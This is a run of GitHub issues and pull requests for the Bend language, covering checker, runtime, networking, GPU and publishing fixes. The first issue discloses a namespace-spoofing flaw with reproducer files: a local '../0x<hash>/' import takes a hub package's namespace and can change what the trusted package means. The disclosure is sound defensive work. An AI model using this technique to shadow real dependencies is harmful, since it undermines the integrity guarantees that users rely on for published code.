title: A local file can take a hub package's `0x…` namespace: `../0x<hash>/f.bend` from a subdirectory is loaded locally but named like the package
body:
### What I did

A hub package lives in `$BEND_LIB/0x<hash>/` and its files get the namespace `0x<hash>/<file>`. `book_load` decides whether an import goes to the cache by testing the normalized import path against `/^0x[0-9a-f]+\//`, but computes the namespace afterwards as `path.posix.join(path.posix.dirname(ns), rel)` ([`book_load`](https://github.com/bendlang/bend/blob/6a77e124/bend2/bend.ts#L1097-L1116)). From a file in a subdirectory, `../0x<hash>/f.bend` does not start with `0x`, so it is read from the local disk, while the join normalizes its namespace to `0x<hash>/f`: exactly the namespace of the package file it imitates.

In the examples below, `0x0123…` stands for `0x0123456789abcdef0123456789abcdef`. The package is already in the cache (`BEND_LIB` points at a scratch directory, `BEND_HUB` is unreachable, and there is no network access).

`$BEND_LIB/0x0123…/f.bend` (the published package):

```bend
import Base

def two() -> Nat:
  Nat.add(1n, 1n)
```

### What happened

**On its own, the local file collides with the package.** Put a local `proj/0x0123…/f.bend` next to the project:

```bend
import Base

def two() -> Nat:
  3n
```

`proj/sub/n.bend`:

```bend
import Base
import ../0x0123456789abcdef0123456789abcdef/f.bend as Fake

def unused() -> Nat:
  0n
```

`proj/main.bend`:

```bend
import Base
import ./sub/n.bend as M
import 0x0123456789abcdef0123456789abcdef/f.bend as F

def main() -> Nat:
  F.two()
```

```text
Error:
- expected : a fresh name (duplicate declaration: 0x0123456789abcdef0123456789abcdef/f.two)
```

The two files have different real paths, so `seen` loads both, and the "one namespace per file" check never fires: two files share one namespace. The real package can no longer be loaded, and the error names the package's own declaration as the duplicate.

**Together with #1002, the local file changes what the package means.** Replace the local file with `proj/0x0123…/f.Nat.bend`:

```bend
import Base

def add(a: Nat, b: Nat) -> Nat:
  7n
```

and import it from `proj/sub/m.bend` as `import ../0x0123456789abcdef0123456789abcdef/f.Nat.bend as N`, with `main.bend` importing `./sub/m.bend` before the package. `bun bend2/main.ts main.bend` then prints `7n` instead of `2n`: the package's `Nat.add` resolves to the local `0x0123…/f.Nat.add` by the rule reported in #1002. The package file in the cache is byte-for-byte what was published; its meaning is not.

A `name@version/f.bend` import is rewritten to the same hash path before any of this (`name_hash`), so named packages are affected the same way. I read this from the code but did not run it, because it needs the hub.

### Why it matters

A hash (or a name@version that never moves) is supposed to fix what a dependency is. Here a local file can occupy the dependency's namespace, and then:
- either it collides with the dependency and blocks it from loading;
- or, through #1002, it rewrites what the dependency's names refer to.

For the LAWS.bend gate, this means laws about a hub library the human trusts by hash can be proven against a different library, and nothing in LAWS.bend, PROOF.bend or the cached package changes.

`pkg_files` also skips every file whose namespace starts with `0x` when publishing, on the assumption that such files come from the hub. From reading the code, a local file that took such a namespace would be checked by the publisher but left out of the published package. I have not run this.

### Expected behavior

The namespace should follow where the file actually comes from: `book_load` should reject a namespace starting with `0x` for any file outside `BEND_LIB`. It may also be worth enforcing "one file per namespace" as well as "one namespace per file". This is separate from #1002: fixing name resolution there removes the rewrite, but the collision above remains.

### Version

```text
bend 2.0.26
commit 6a77e124
Bun 1.4.2
Darwin arm64
```

title: Reserve opaque template names across validation order
body:
The checker accepts a closed inhabitant of `Empty` when a later declaration reuses the generated name of an opaque `~` template binder. Validation deliberately hides later declarations, so the existing freshness check sees only the partial TLD table; after validation, the checked body's `Ref` can resolve to the later declaration.

Reserve every parsed TLD and constructor name before ordered validation, and check generated opaque names against that complete set. Ordered replay still hides future declarations for ordinary forward-reference checking. The regression suite includes the reported constructor/TLD capture and a constructor declared after a valid template fill.

Closes #994.

Validation:

- Current unpatched upstream accepts the reported reproducer with `All terms check.`; this branch rejects it with `a fresh ~ binder name`.
- Local check/interpret harness: 1,416 of 1,429 tests matched exactly. The other 13 are TCP/UDP tests blocked by this sandbox's socket permissions (`Operation not permitted` / no free port).
- `bend2/base.bend --check-only` passes with only its expected two unsafe/foreign notices.
- TypeScript produces the same four pre-existing diagnostics on upstream and this branch; this change adds none.
- `gates/repo.ts` could not run locally because its external `ttok` executable is unavailable.

title: C runtime: repeating the same pure work in one process slows it up to 17x, as the free chains lose address order (2.0.26)
body:
### What you did

```
bend repro.bend -o repro
./repro --threads 1
./repro --threads 4
./repro --threads 16
```

`repro.bend` (below) builds the same ~3M-char `String` 24 times in one process: 512 rows of number text, the rows forked in halves, then measures its length and prints ms per round.

### What happened

The work is identical every round, but each round is slower than the one before, and it levels off at 3-17x. With threads it gets worse than with one: past round ~10, 4 and 16 threads are slower than 1.

```
t=1:  72 70 66 62 70 77 90 105 135 157 175 204 207 215 232 229 243 249 252 247 252 243 250 236
t=4:  33 34 37 44 53 73 88 113 144 157 189 216 253 263 279 314 355 364 413 432 457 498 531 550
t=16: 35 30 33 42 47 65 84 114 125 152 184 199 229 257 282 298 357 349 353 407 442 479 464 489
```

It is not a leak: RSS stays flat (159 MB after the first round, 167 MB peak over all 24 at 4 threads). It is not the number of IO steps either: 2,200 empty `IO.write("")` steps between rounds change nothing.

#### What the counters say

`perf stat` on `repro.bend` at `--threads 1`, per round, a 3-round run vs the 24-round run:

| per round | 3 rounds | 24 rounds |
|---|---|---|
| instructions | 1.12e9 | 1.11e9 |
| cycles | 3.14e8 | 9.21e8 (2.9x) |
| LLC misses (`cache-misses`) | 2.31e5 | 2.47e6 (10.7x) |

Same instructions, 2.9x the cycles: the program does the same work but waits on memory. `perf record` samples per round, 3-round vs 24-round run: `String.length` 19 -> 119 (6.3x; it only walks the cells), `String.append` 267 -> 672 (2.5x), `U32.show` 15 -> 41 (2.7x).

#### Likely cause

The HOT chains are LIFO, and a generation is parked (`heap_hand`) and later reused (COLD, then the bank) in whatever order its slots were freed. Nothing restores address order, so over rounds a fresh `String`'s cells come from slots scattered across the heap, and walking it misses cache on almost every cell. Counting in the generated C of a variant (same rows/cells shape), over 24 rounds at `--threads 1`: 45.5k `heap_hand`, 18k COLD adoptions, 27k bank pops, but only 2.3k fresh quanta, so nearly every cell comes from a recycled chain.

Plain `List<U32>` churn (build 2^22 in parallel, take its length, repeat) does **not** degrade (flat 40-46 ms at 16 threads over 20 rounds), and neither does text built from literals. It takes `U32.show`, whose short-lived temporaries interleave with the string cells in the chains.

#### Evidence it is the chain order

In the generated C of that variant, sorting the chain by address inside `heap_hand` before it becomes COLD makes the curve flat:

```
t=1 baseline: 121 117 118 129 132 145 162 180 206 229 283 281 319 341 361 394 398 382 428 405 422 418 441 429
t=1 sorted:   518 668 674 671 665 679 670 677 673 675 671 677 676 680 676 695 688 674 679 684 684 681 673 679
t=4 baseline:  65  69  73  87 104 127 153 186 224 262 306 344 378 434 461 528 547 615 647 743 736 805 837 870
t=4 sorted:   324 357 354 370 365 368 363 367 358 364 378 369 373 379 372 375 376 377 368 380 385 384 382 381
```

The `qsort` itself is far too slow to be the fix (~0.5 s a round), and sorting only every 16th hand-off bounds the growth (t=4: 90 -> 213 ms) at a ~40% cost on a fresh run, so I'm not sending a PR. An allocator that keeps a page's slots together (per-page free lists, as in mimalloc's free-list sharding) would probably get the flat curve without the sort, but that is a design call for you.

Why it matters: this is the shape of any long-running Bend program (an `App.run` loop, a server, a renderer writing frames), and it shows up after a few seconds.

### The file

```python
import Base

### one "frame": 2^9 rows x 768 cells of number text, rows built in parallel
def cell(+x: U32, +y: U32) -> String:
  U32.show(x) ++ " " ++ U32.show(y) ++ "\n"

def row(n: Nat, +x: U32, +y: U32) -> String:
  match n:
    case 0n:
      ""
    case 1n+p:
      cell(x, y) ++ row(p, (x + 1 : U32), y)

def rows(+d: Nat, +y0: U32) -> String:
  match d:
    case 0n:
      row(768n, 0, y0)
    case 1n+p:
      +half = (1 << p : U32)
      a b = rows(p, y0) rows(p, (y0 + half : U32))
      a ++ b

### the same pure work 24 times; prints ms per round
def loop(n: Nat) -> IO(Unit):
  match n:
    case 0n:
      IO.pure(Unit, Unit{})
    case 1n+p:
      do IO<Unit>:
        t0 : Nat <- IO.now()
        IO.write(Nat.show(String.length(rows(9n, 0))) ++ ":")
        t1 : Nat <- IO.now()
        IO.print(Nat.show(Nat.sub(t1, t0)))
        loop(p)

def main() -> IO(Unit):
  loop(24n)
```

### bend --version

2.0.26

### uname -sm

Linux x86_64 (AMD Ryzen 7 7700, 8 cores / 16 threads)

### clang --version

clang version 22.1.8

title: `Nat.read("7")` in a checked equality never finishes: every digit is compared against a unary 2^48 - 1
body:
### What I did

```bend
import Base

def seven() -> {Nat.read("7") == Some{7n} : Maybe<&2, Nat>}:
  {==}
```

```text
bun bend2/main.ts seven.bend --check-only
```

### What happened

After two minutes the check had still not finished, using a full core. Evaluating `Nat.read("7")` with `term_snf` hangs the same way. `U32.read("7")` evaluates in about 0.2 s, and the compiled program prints `7` immediately.

### Why it happens

`Nat.read.go` guards every digit with

```bend
Nat.read.fit(acc, Nat.divmod(Nat.sub(Nat.read.max(), U32.to_nat(d)), 10n))
```

where `Nat.read.max()` is `Nat.mul(U32.to_nat(16777215), U32.to_nat(16777217))`, that is, 2^48 − 1. The checker's Nat is unary, so computing that bound and dividing it by ten means building and walking about 2.8 × 10^14 successors, and this happens for every digit, including the first one of `"7"`. The runtime lanes do this with native integers, which is why the program itself is instant.

As a result, no law that mentions `Nat.read` on a concrete string can be closed by evaluation. For example, `{Nat.read(Nat.show(n)) == Some{n}}` cannot be checked at `n = 7n`, and a law about a parser built on `Nat.read` cannot be tested on an example.

A related surprise: the same bound makes `Nat.read` return `None{}` for any input above 2^48 − 1 (`Nat.read("281474976710656")` is `None{}` on the runtime too). So `Nat.read(Nat.show(n)) == Some{n}` is false for large `n`, even though `Nat` is unbounded. Neither the bound nor the checker cost is documented next to `Nat.read`.

### Expected behavior

The check should finish quickly on small inputs. One way would be for the overflow guard to compare the digit count, or to use a bound that is cheap to evaluate in unary, rather than dividing 2^48 − 1 on every step. If the 2^48 − 1 cap is intended, a comment next to `Nat.read` saying so would help readers of laws that use it.

### Version

```text
bend 2.0.26
commit 6a77e124
Bun 1.4.2
Darwin arm64
```

title: Nat.read compares its bound as fifteen digits, so a checked read of 7 finishes
body:
## Summary

`Nat.read` divided the unary nat `2^48 - 1` on every digit, so `{Nat.read("7") == Some{7n}}` never finished (#1008). The bound is the fifteen-digit text `281474976710655`. Leading zeros are stripped first. A shorter all-digit string is in range, a longer one is `None`, and fifteen digits compare as text. `Nat.read.max` is gone; nothing in the repo called it.

The length check is exact, so a sixteen-digit string is `None` even when its text sorts before the bound, and leading zeros still read as the number they spell (`0000000000000007` is `7`).

The values pinned by `tests/base/read_bounds.bend` are unchanged, including `10^14` through `2^48 - 1` (a plain digit cap once rejected that range).

## Test plan

- [x] `tests/base/read_bounds.bend --check-only` closes, including equalities for `"7"`, `"007"`, `"000"`, `""`, `"12x"`, `"1000000000000000"`, `"281474976710656"`, and `Nat.show(7n)`
- [x] The same file prints its `#|` lines from the interpreter, from emitted JS, and from the C binary, including the sixteen-digit and leading-zero cases
- [x] `tests/base/text_ops.bend` still prints `14`
- [ ] Cluster gate (not run here)

title: Resume checking over a checked parent book, for external incremental compilation
body:
This PR was vibe-implemented by Claude (Anthropic's Opus 5.5, via Claude Code) at our direction. We needed it so that [`github:o1lo01ol1o/bend-proof-of-compile`](https://github.com/o1lo01ol1o/bend-proof-of-compile) could do incremental compilation with content-addressed (CAS) artifacts and some not-terrible proofs of compilation. That tool keeps checked states and build artifacts under content keys, and resumes checking from the longest stored prefix of a program's load order instead of checking everything again.

We don't know whether you'd want to merge this or re-roll it by hand, and either works for us. Note that `AGENTS.md` says `bend2/bend.ts` is human-written and not to be edited, and most of this PR edits it. If you'd rather re-roll, the commit messages explain each change and the regression tests pin the behavior. Either way, we can't stop building through `bend-proof-of-compile` (and our fork) until Bend supports incremental compilation, because some of our modules now take hours to compile.

## What it adds

| Commit | Change |
|---|---|
| `c52f87d2` | Export `BookState` and `book_read(file, unsafe_seed?)`, so a tool can supply a checked prefix |
| `f741861b` | A value shared by lets is walked once, so reporting and compiling a type built from lets is linear, not exponential. `term_lower(t, d, low?)` takes an optional (node, depth) cache, and `term_id` numbers terms by hash-consed keys. |
| `4c3675a8` | Six regressions in `tests/snapshot/` for cold behavior that incremental checking must keep |
| `b25b3715` | A checked book can be a parent: a law's fill copies its record instead of writing into it, and `book_valid(book, done)` resumes over a parent's tables without re-installing them; adds `book_over` and `book_flat`. `--checkup` builds on Base only when `import Base` comes first. |
| `5ac540a5` | The `PROOF.bend` rule throws instead of exiting the process |
| `2c9dbb56` | `book_load(…, on)` reports each loaded file's realpath, namespace and text in load order, and can skip its parse |
| `37631c36` | A flat copy of a checked book keeps its datatypes' constructors |
| `fa112c92` | `book_read` returns a seeded book flat |
| `fe19c6f1` | A child book starts from its parent's counts of holes and open laws, so a resumed check's TODO verdict is the cold one |

The commits were written on our fork and ported onto `main` at `6a77e124`; each message says which fork commit it came from.

## API

```ts
// A child over a checked parent. The parent is never written.
const child = Main.book_over(parent.book);
const done = child.order.length;
await Bend.book_load(child, entry, "", new Map(parent.seen), undefined, on);
Bend.book_valid(child, done);   // checks only the new events
child.hols + child.open;        // the cold TODO count
Main.book_flat(child);          // before emitting: the emitters read own properties

// The load order, without parsing anything.
await Bend.book_load(Bend.book_nil(), entry, "", new Map(), undefined, () => true);

// A seeded file checks in a book_over child and comes back flat.
await Main.book_read(file, unsafe_seed?, on?);
```

`on(real, ns, text)` is called for each newly loaded file, after its imports and before its parse; returning `true` skips the parse. The walk still resolves imports as a load does, so `name@version` and `0x…` imports can reach the hub the first time.

## Visible changes

- Types built from chains of lets no longer blow up. On `main`, a chain of 24 lets (check, report, C and JS) runs for 115 s and ends in "the machine stack overflowed"; with this PR it builds in 0.14 s.
- `--checkup` checks a module on the Base parent only when `import Base` is its first import, and checks it cold otherwise. Before, a module that used Base's names before its own `import Base` passed `--checkup` but failed a cold check. No public test imports Base after another module.
- A `PROOF.bend` without `./LAWS.bend` still prints the same error and exits 1, but through a thrown error, so a program that embeds the checker keeps its process, and `--checkup` goes on to later modules.

## Verification against `main` (`6a77e124`), run locally

- The `--check-only` output of all 1498 public inputs, and the C, JS and CLI output of all 774 runnable tests, are byte-identical. Every `--checkup` section is identical; the only additions are the six new tests' sections.
- The six new tests give their expected output; the three with a `main` also match in the interpreter, JS and C (C with Apple clang 15).
- 1121 Base-first tests checked as children of one Base parent with frozen records: nothing was written into the parent, none of its names was re-installed, and the C and JS of the 635 with a `main` equal their cold compile.
- Sibling children filling one open parent law as `Nat` and as `Bool` match the cold runs, and children of a parent with an open law or a hole reach their cold TODO counts.
- Check CPU on the five checker benches is 1.012x and compile CPU on the sixteen runtime benches 1.008x (medians of three, on a laptop).
- `gates/repo.ts` passes at the current caps, and strict TypeScript reports only the two existing diagnostics.

Not run: `gates/test.ts` and `gates/perf.ts`, which need the mini cluster.

## Size

| File | `main` | This PR | Cap |
|---|---|---|---|
| `bend2/bend.ts` | 43,431 | 43,938 | 44,000 |
| `bend2/comp.ts` | 62,163 | 62,297 | 64,000 |
| `bend2/main.ts` | 8,998 | 9,471 | 10,000 |

No cap changes; `bend.ts` has 62 tokens left.

## Trust and scope

- `unsafe_seed` must be a complete, previously checked prefix of the file's own load order, with its loader map; it is trusted, not re-verified. The seed is never written, but term graphs are shared, so a later compile can force the seed's memo cells: this is not isolation between concurrent sessions.
- The book representation is internal, not a stable wire format. Bend gets no cache, codec, hashing or persistence; those stay in the external tool.

## Not in this PR

- Compiling from a restored state without stored elaborations (a replay mode for `book_valid`) is still in progress on our fork.
- A single resume entry point, after which `unsafe_seed` and the flat-book paths could go.

title: TCP.connect_within connects with a deadline, as TCP.poll receives with one
body:
```python
def TCP.connect_within(host: String, port: U32, ms: U32) ->
  IO(Result<&1, &1, U32 & String, Socket>)
```

It answers as `TCP.connect` does, with one more way to fail: if the handshake
has not finished `ms` milliseconds after the call, the connect fails with
`ETIMEDOUT` and the socket it opened is closed.

## Why

`TCP.connect` has no deadline. To an address that silently drops SYNs it waits
for the kernel's own timeout: here (Linux, default `tcp_syn_retries = 6`) a
native build of `TCP.connect("192.0.2.1", 80)` answered `110 Connection timed
out` after 134 s. `TCP.poll` (#861) gave a receive a deadline; connecting is
the one step left where a client cannot bound its time. A program with a total
deadline can refuse to *start* a connect once the deadline has passed, but
cannot bound one in flight, and nothing outside can end it: the program holds
no handle to a connect that has not answered.

## Design

- **A new def, `TCP.connect` unchanged.** The alternative is to add `ms` to
  `TCP.connect` itself; that breaks every caller, while the Base IO additions
  in the changelog are new defs beside the old ones (`TCP.poll` beside
  `TCP.recv`, `File.read_at` beside `File.read`), and it is the shape #972
  settled on after review (`TCP.listen_shared` beside `TCP.listen`). The name
  reads as `read_at` and `send_to` do: a preposition naming the extra
  argument.
- **One source for both.** The two defs share `tcp_connect.c` and `.js`, each
  effect under its own CID guard, as `file_read.c` does. `TCP.connect` runs the
  same code as before with no deadline on its park (`0` to `io_wait_on`,
  `undefined` to `io_park_on`), so its wake is the one it had. `comp.ts` does
  not change: both parks already take a deadline.
- **`ms` is relative, as in `TCP.poll`**: the deadline is `io_tick() + ms *
  1000000` in C and `performance.now() + ms` in JS, taken when the effect runs.
  No special case for `ms = 0`: the deadline is now and the poller answers at
  once.
- **Expiry fails with `ETIMEDOUT`**, the error the kernel's own timeout gives
  (above), through `io_fail` on both lanes, so the text is libc's `strerror`
  as for every other failure; the fd is closed by the path that already closes
  it on any error. No `Maybe`: unlike a `TCP.poll` that answers `None{}`, a
  timed-out connect leaves no socket worth handing back.
- **A deadline is never read as success.** The park waits on writability and
  on the clock, whichever fires first, and the wake is not told which. So a
  wake of a park with a deadline first asks the socket, without waiting,
  whether it is writable (`poll` in C; in JS `select`, the one readiness call
  `io_sys` binds). Not writable: the wake came from the clock and the connect
  is still pending, so it fails with `ETIMEDOUT`; a failed `poll`/`select` is
  read the same way. Writable: `SO_ERROR` says how the connect ended, exactly
  as `TCP.connect`'s wake does. Without that check a deadline wake would read
  `SO_ERROR = 0` from a pending socket and answer `Done`. A handshake that has
  finished when the wake runs, even at or past the deadline, answers how it
  finished, as a `TCP.poll` wake that finds data answers it. On Linux this is
  what `ms = 0` to a local listener shows: loopback has finished the
  handshake by the time `connect()` returns `EINPROGRESS`, and 200 of 200
  such connects answered `Done` on the interpreted, JS and C lanes.

## Tests

`tests/io/tcp_connect_within.bend`, on the check, interpreted, JS and C lanes:

1. to a local listener (a free port found by a failing `TCP.listen`, as the
   other TCP tests do) it connects and the socket carries a send and a recv;
2. to that port after the listener closes it fails with `Connection refused`:
   the deadline rewrites no error;
3. to TEST-NET-1 (`192.0.2.1:80`) with `ms = 200`, beside a 1500 ms timer, it
   fails before the timer prints. The line names the outcome, not the error,
   so a network that refuses the address at once prints the same lines.

Unlike `tcp_connect_black_hole`, the test needs no `IO.die`: the connect ends
at its deadline, so the program ends with the timer. The C lane here, each
line stamped by a wrapper as it arrived:

```
      1 ms  bend-within
      1 ms  Connection refused
    202 ms  hole: failed
   1504 ms  timer
```

The JS lane printed the same lines at 29, 30, 231 and 1538 ms, and the
interpreted lane at 181, 182, 383 and 1686 ms (its start-up and check
included).

It fails on this machine, on all three run lanes, with either change undone:

- `TCP.connect` in place of the 200 ms connect prints `timer` and then does
  not end (the harness's alarm kills it);
- without the writability check, the deadline wake answers `hole: connected`.

A scratch program printed `110 Connection timed out` for `ms = 200` (201-202
ms) and for `ms = 0` (0 ms) on each lane, and `22 Invalid argument` for a bad
host or a port past 65535, as `TCP.connect` answers them. 1000 connects in a
row to 192.0.2.1 with `ms = 0`, under `ulimit -n 64`, all answered `ETIMEDOUT`
on the JS and C lanes: the timed-out socket is closed. Four concurrent copies
of the test, three rounds, passed 12/12 on the JS and on the C lane.

Regression: `tests/io`, `tests/base` and `tests/reg` (236 tests) through the
same four lanes give identical results on this branch and on 6a77e124: 172
pass every lane on both, and the other 64 fail a local runner simpler than the
gate the same way on both (expected checker errors, the `exit N` line the gate
appends, mains that cannot be printed, tests with their own foreign twins).

Merge: clean with #972, #977 and #978, pairwise and all four together in every
order (one resulting tree). On that tree the eleven `tcp_*` tests, the other
three PRs' included, and `port_bound` pass on all four lanes.

## Not tested

- macOS: not tested. The macOS constants (`ETIMEDOUT` = 60) and the
  zero-timeout `poll`/`select` on a connecting socket are unverified there; the
  loopback `ms = 0` result above is Linux only, and the test does not rely on
  it.
- The black-hole case shows the deadline only where the network drops packets
  to 192.0.2.1, as it does here. In a sandbox with no route the connect fails
  at once, the test prints the same lines, and it does not discriminate.
- A handshake that finishes in the same instant as the deadline cannot be
  forced; the rule for it is the one above.

title: A ! call's long sequential loop parks between launches, so no dispatch holds the GPU (#942)
body:
This should fix the Mac crash in #942. **Nothing here has run on a GPU, so I'm asking a maintainer to confirm it on a Mac** (see the end).

## The problem

In #942, a `!` call with no parallelism never finished its command buffer, and WindowServer's watchdog took the session down. That program's work is three long sequential loops: `fill` and `fold` over 2^28 cells, and a BFS over the same grid. Each loop compiled to a native spin (`emit_native`), a C loop that runs whole inside one step of `work_loop`. So the whole run happened inside one dispatch.

## The change

**Which loops change (00bfabae, a squeeze in the last commit).** `carb_park` walks the call graph from the bang targets and stops at a loop. A loop it reaches with no other loop above it (a fork tree counts as a loop) is a *top loop*.
- A top loop is no longer flat, so it compiles as a segment instead of a spin.
- An inner loop stays a spin. It runs once per turn of the loop above it, and paying a segment's call there costs real time. I first tried converting every loop a bang reaches, and it cost kmeans 3× and raytrace 1.6× on the cores. The narrow rule leaves all 16 runtime benches' emitted C unchanged.

**Parking (0f0771d5, 308bf770).** Each top loop's self-jump emits `WL_PARK(N, F, words)`. Every 4096 jumps it spends one unit of the lane's fuel (`FUEL` = 64 per launch, so about 262k turns).
- When the fuel is spent, it pushes the jump's N words and `F | N << 16 | seq << 24` onto the lane's stack. Out of line, `wl_park` copies the stack to the heap and deals it as a frontier task tagged `TAG_PRK`, bumping `H_CURSOR` so `cube_run` launches again.
- `work_loop` takes a `TAG_PRK` task back onto any lane's stack.
- Pass 0 skips parked tasks, and a lane ends its pass 1 once it has parked. So a launch runs a chain for about one budget at most.
- The fuel is one word per lane in the `alc` block, past `ALC_LEN`, where the host keeps `ALC_COLD`.

**Programs with no top loop pay nothing.** `#define PARKS` says whether a program has any park site. Without one, the resume path, the fuel word and its checks compile out, and the corpus layout is main's.
- All 16 runtime benches have no park site.
- For each of them, the preprocessed C (for the cores and for the device) is main's, up to how constants are spelled (`2 * 32` against `(2 * 32 + 0)`).
- Their `bend_dev` register counts under NVRTC match main's exactly.

**Where parks go.** An earlier version parked at the top of `work_loop`. That stored the whole register bank there and cost up to +12 registers (queens 94→106). Parking at every loop's jump was worse (queens 120). Park sites only at top loops is what keeps everything else at main's kernel.

**The `--gpu` span is bounded (633dbdfe).** #942 found that an explicit `--gpu 8GB` was wired whole, because only the default went through `gpu_span`.
- `gpu_span` now returns the device's limit: Metal's recommended working set under its largest buffer, or CUDA's total memory.
- Both the asked span and the default stop at that limit. An asked span over it prints `bend: --gpu is over the device's NMB; using that` on stderr.
- Metal's default stays 2 GB, and the cores' span is unchanged.
- This bounds one process. Several GPU programs running at once can still add up past the machine's memory.

**A build knob (9000e4b4).** `-DFUEL=n` sets the budget for a host whose GPU watchdog is tighter than macOS's. The host passes it to the device compiler (NVRTC `-D`, Metal preprocessor macro), and it's part of the CUDA `.gpu` cache key.

## What I verified

None of this ran on a GPU.

- **#942's program:** `fill`, `bfs` and `fold` compile as segments with one park site each. The kernel compiles with NVRTC 13.3 for `sm_89` (72 registers, no spills).
- **Benches and tests:** the 16 runtime benches and 8 `!` tests compile with NVRTC, also with `-DFUEL=16`. There are no new warnings and no spills. Every program without a park site has main's register count. The two that have one: `symreg` 66→72 (same occupancy, since registers are allocated in eights) and `gpu_reach_closure_list` 55→58.
- **Host code:** `clang -fsyntax-only -Wall` passes for the CUDA host lane and the cores lane, with and without `-DFUEL=16`, including the span cap.
- **Native test run:** I built every runnable test as a native binary (Ubuntu 24.04, clang 18) on main and on this branch. 604 pass on both, with the same verdict for every test.
- **Not compiled here:** the Metal host (Objective-C) side of the span cap, which is two lines in `gpu_span`.
- **Size:** `comp.ts` is 63,489 tokens.

## What I could not verify

- **Metal:** I had no Metal compiler, so the gate's first shader compile is the first Metal build.
- **Parking itself:** a test that parks needs more than 262k loop turns in one `!` call, and the interpreter lane can't do that inside the 5 s alarm. No gate test parks.
- **A request:** could a maintainer run the p1.bend program from #942 on a Mac with a display (`bend p1.bend -o p1 && ./p1 --gpu 2GB`)? It should print `1635505109` without the display freezing.

## Limits

- **Inner loops:** a loop under another loop, or inside a fork tree's leaf, stays a spin with no park site. A short outer loop around a huge inner loop still holds a launch for each inner call, and so does a fork-tree leaf that loops for a long time. Covering those needs park sites in hot code, which costs registers everywhere (see above).
- **#942's other point:** a warning for `!` with no parallelism is left for a follow-up. With this change, such a call no longer holds the GPU, so the warning would only be about performance.

title: Publishing: LICENSE files, the terms notice, and the client version
body:
All changes are in `bend --publish` (`cli_publish`, `pkg_files` in `bend2/main.ts`). How packages are read, fetched and hashed doesn't change.

## What changed

- **LICENSE files.** For every directory that holds a published file, a file named exactly `LICENSE` (case-sensitive; checked with `readdirSync`, so it works on a case-insensitive disk too) is published at the matching path. It's just one more entry in `files`, so the hash formula is the same.
- **No `LICENSE`, warning.** If no file is named exactly `LICENSE`, the CLI warns that the package is MIT-0 and says to put the license in a file named `LICENSE` beside the entry file. There are no special cases for `LICENSE.md`, `COPYING` and so on.
- **`license` directories are refused.** A directory named `license` in any case (for example `License/x.bend`) is refused in `pkg_files`, before the proof of work is mined.
- **Notice on every publish.** It goes to stderr before login and mining, with no prompt:
  ```
  Publishing to BendHub: public and permanent, under https://bend-lang.com/bender/terms#s18
  License: MIT (LICENSE)
  ```
  The license comes from the shallowest `LICENSE` (ties go to the first path in string order). Its SPDX id follows the hub's rule in `hubdb.ts`, copied exactly: `SPDX_RE`, only the first 5 lines, at least one letter in the id, runs of whitespace collapsed. If there's no id, the notice says `see <path>`. The CLI doesn't recognize license titles the way the hub does, so a title-only LICENSE shows `see <path>`. With no `LICENSE`, it shows `MIT-0, the default (no LICENSE file): …#s18.4`.
- **User-Agent: `bend/<VERSION>`.** In CLI mode only, `ua_fetch` wraps `fetch` so every request to `BEND_HUB` or `ORIGIN` carries it: publish, publish-check, link, register, name lookups, package reads, the Bender login and the version check. Name lookups happen in `bend.ts`, which isn't edited; the wrapper covers them. Requests to other hosts (a program's own) are left alone.
- **Guide.** A paragraph under the import/publish section: put a `LICENSE` next to the entry file, ideally with an SPDX line; without one the package is MIT-0; you are responsible for what you publish, so pick the right license; adding a `LICENSE` changes the hash, so publish it as a new version.

## Tests (`gates/ping.ts`)

The gate's Caddy stand-in now serves the store's files under `/0x<hash>/`, as the real Caddy does, and records every request's method, path and User-Agent. Its new checks, run with the installed executable against the local `hub.ts`:
- A `LICENSE` beside the entry and one beside an imported `sub/two.bend` are both published. The printed hash equals the hash of all four files, and the hub serves `sub/LICENSE`.
- The notice shows the SPDX id (`License: MIT (LICENSE)`). Each case from the table is also published, and the notice must match the hub's `license.id` from `/package/<hash>.json`: a `\r\n` ending, `(MIT  OR Apache-2.0)` collapsed to one space, `#` and `//` markers (no id), `MIT <see below>` (no id), `()` (no id), and the SPDX line on the 6th line (no id). With a looser regex in `main.ts`, the three rows it treats differently fail.
- With only a `LICENSE.md`, it isn't published (the hash covers only the `.bend` files), and the notice shows MIT-0 plus the warning.
- `License/two.bend` is refused before mining: exit 1, no "mining" line, no POST reaches the hub.
- The publish POST, a package manifest read, a `/name/` lookup and `/check` all carry `bend/<ver>`. With the `ua_fetch()` call removed, this check fails.

`SITE_REPO=~/work/hoc-credits bun gates/ping.ts` gives `PASS: 32 / 32` (the site checkout is on `site-fixes`, which has #36). `gates/repo.ts` gives `PASS: 46 / 46` (main.ts is at 9694 of its 10000 ttok cap). `tsc` finds no errors in `main.ts` or `ping.ts`.

## Release order

⚠️ The live hub refuses `LICENSE` files until bend-lang.com PR #36 is deployed. Don't release a CLI with this change until then. The LICENSE check in `ping.ts` also needs a site checkout that includes #36.

title: Exit nonzero when proof checks rely on unsafe or foreign code
body:
Fixes #966. A file without `main`, or a `--check-only` invocation, now exits 1 when its proof verdict reports a claim relying on `@unsafe` or foreign code. The verdict still names the offending dependencies; on current main it also includes non-Base laws filled in imported files. Runs, builds and publishing retain their warning-only behavior so foreign effects remain usable.

The six original unsafe/foreign fixtures check the exit status as well as the dependency list. The issue’s three-file `LAWS.bend` / `PROOF.bend` repro exits 1 normally and under `--check-only`. The imported unsafe-law cases added upstream now assert the same exit contract; a safely filled imported law stays clean.

Verification: the unsafe no-main and explicit `--check-only` cases exit 1, the imported false-law and derived-law cases exit 1, the safe unused-law case exits 0, and `bun gates/repo.ts` reports PASS 46/46. The cluster gate was not run; project TypeScript checking retains unrelated diagnostics in `bend2/bend.ts` and optional `canvas` documentation tooling.

title: Compile flat constructors with more than 255 fields
body:
Fixes #991.

The C backend stores constructor arities in `CID_ARITY_T`. The table is now emitted as `u32` only when a constructor needs more than 255 words; all other tables retain their existing 8-bit limit. A program whose arities fit in 8 bits still emits byte-identical C (verified on the #1007 reproducer).

`tests/reg/record_256_fields.bend` builds a flat 256-field constructor and checks its first and last fields after matching it. Before this change the checker and interpreter accepted the test but C emission failed with `Error: an arity over 255`. Afterward the interpreter, emitted JS, and native C all print 255. A separate 512-field repro builds and runs natively (output 42); existing 255-field and boxed wide-record native cases still print 1 and 113.

Verification: local `--checkup` for the three fixtures passes; `bun gates/repo.ts` reports PASS: 46 / 46; `git diff --check` passes. The cluster/GPU gates were not run. Project-wide TypeScript checking still reports four diagnostics in untouched `bend2/bend.ts` and `bend2/docs/gen_*.ts` (missing `canvas` types).

title: A long constructor chain compares in constant stack
body:
